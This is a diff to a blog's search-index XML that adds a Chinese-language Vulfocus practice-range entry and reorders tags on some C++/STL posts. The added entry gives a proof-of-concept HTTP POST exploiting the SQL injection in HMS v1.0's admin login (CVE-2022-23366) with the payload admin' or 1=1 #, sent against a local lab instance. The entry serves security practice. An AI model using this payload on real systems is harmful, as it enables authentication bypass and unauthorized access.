@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>Vulfocus 靶场记录（一）</title>
+    <link href="/Vulfocus-%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <url>/Vulfocus-%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="HMS-v1-0-SQL注入-CVE-2022-23366"><a href="#HMS-v1-0-SQL注入-CVE-2022-23366" class="headerlink" title="HMS v1.0 SQL注入(CVE-2022-23366)"></a>HMS v1.0 SQL注入(CVE-2022-23366)</h1><p>注入点在登录页面</p><p>poc：</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminlogin.php</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:43193<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;144&quot;<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:43193<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:43193/adminlogin.php<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n30rtma1gnnk63cb900vd524n7; _ga=GA1.1.1607377646.1774331048; _gid=GA1.1.857868182.1774331048; _gat=1; _ga_J1DQF09WZC=GS2.1.s1774331469$o1$g0$t1774331469$j60$l0$h0<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<span class="language-routeros"><span class="hljs-attribute">loginid</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1 #&amp;<span class="hljs-attribute">password</span>=12345678&amp;submit=Login</span></code></pre></div>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web安全</tag>
+      
+      <tag>靶场</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>前端开发--VUE</title>
     <link href="/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-VUE/"/>
     <url>/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-VUE/</url>
@@ -573,9 +594,9 @@
     
     <tags>
       
-      <tag>C++</tag>
-      
       <tag>STL</tag>
+      
+      <tag>C++</tag>
       
       <tag>算法</tag>
       
@@ -596,9 +617,9 @@
     
     <tags>
       
-      <tag>C++</tag>
-      
       <tag>STL</tag>
+      
+      <tag>C++</tag>
       
       <tag>算法</tag>
       
